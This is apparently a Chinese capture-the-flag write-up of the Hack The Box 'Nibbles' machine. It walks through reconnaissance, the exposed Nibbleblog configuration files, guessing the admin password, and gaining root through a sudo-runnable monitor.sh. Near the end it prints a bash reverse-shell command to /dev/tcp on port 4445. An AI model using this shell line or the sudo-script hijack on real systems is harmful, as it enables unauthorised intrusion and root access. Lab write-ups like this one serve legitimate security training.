# 0x01 信息收集与探索

使用Nmap对靶机地址进行端口嗅探，发现对外开放22、80端口，操作系统为Linux。

![](../Images/b7a17ccb11c34ccfbe09f69a7474c192.png)

查看80端口Web服务，显示”Hello World“，在源代码中发现nibbleblog/目录。

![](../Images/53a864a421f80bbb88459e31f2ee43de.png)

在http://10.129.104.176/nibbleblog/目录，通过”Powered by“信息，得知网站使用Nibbleblog组件。

![](../Images/8374d92bce967a815dd9ec8e7518fd14.png)

先使用Dirsearch对http://10.129.104.176/nibbleblog/进行目录扫描，发现可以访问的目录及页面，一一访问。

![](../Images/c8c1474fe0534ad453ccf409f4cbced2.png)

在http://10.129.104.176/nibbleblog/README页面发现nibbleblog版本为4.0.3。

![](../Images/5d316ebb01be600b9a2bbb013e21d365.png)

在http://10.129.104.176/nibbleblog/admin.php页面发现登录页面。

![](../Images/9fac324511cab65eabdc085351a9c9f5.png)

在http://10.129.104.176/nibbleblog/content/private/users.xml页面发现admin账户。

![](../Images/c51fc61f580300dcdd15582d56c5e03f.png)

在http://10.129.104.176/nibbleblog/content/private/config.xml页面发现admin@nibbles.com邮箱地址。与此同时，还发现大量.bit后缀的类似源代码的文件。

![](../Images/c879ee93dbddb0e549d51673d25fe567.png)

使用Searchsploit对”nibbleblog 4.0.3“进行漏洞发现，发现存在文件上传漏洞，且为MSF漏洞利用脚本。

![](../Images/73a313c83e14edbf066f9ca6c91e5f2a.png)

尝试使用exploit/multi/http/nibbleblog\_file\_upload模块对其利用，发现需要PASSWORD信息。

![](../Images/8fb6fbda90ee59a3ac58bb2e8f8c46a7.png)

尝试使用Burpsuite对登录页面进行爆破，发现爆破动作被发现且阻止（爆破动作忘记截图，以下重放动作同样可以证明），无法通过爆破手段获取admin的口令信息。

![](../Images/d3c82834c9a079ea1d97e73ae46c0d56.png)

尝试利用已获取的敏感信息进行口令猜解，最终根据”admin@nibbles.com“获取到admin/nibbles的登录信息。

![](../Images/5384be87df92e4abeb731e4b0657d4a3.png)

# 0x03 权限提升

执行sudo -l，发现/home/nibbler/personal/stuff/monitor.sh具备root执行权限。

![](../Images/5047123408dd4f3da684e9883ff8d906.png)

查看monitor.sh信息，发现没有该文件。

![](../Images/0673009676c91b7254a44a04a447c98d.png)

在/home/nibbler文件夹下发现personal.zip，解压后出现/home/nibbler/personal/stuff/monitor.sh路径，查看脚本信息。

![](../Images/7d3750abff9216e2a64ff9a6cf307b64.png)

更改monitor脚本信息，写入反弹shell。

![](../Images/44e87e75cfc5ffa190018790ed47ee09.png)

*   
*   

```
echo "#!/bin/bash" > monitor.shecho "sh -i >& /dev/tcp/10.10.14.4/4445 0>&1" >> monitor.sh
```

![](../Images/af46334153c4a023f6a5149146e78286.png)

Kali机用NC监听4445端口：

![](../Images/8296e4b3e3809722ef1b898d5bea2ac0.png)

使用sudo命令运行/home/nibbler/personal/stuff/monitor.sh脚本，成功回弹root权限的shell。

![](../Images/5c89b8ddb127e2cdb67a701141dad028.png)

在root目录下成功获取root.txt。

![](../Images/3e1f8d370b496997b553f676b02bfe97.png)
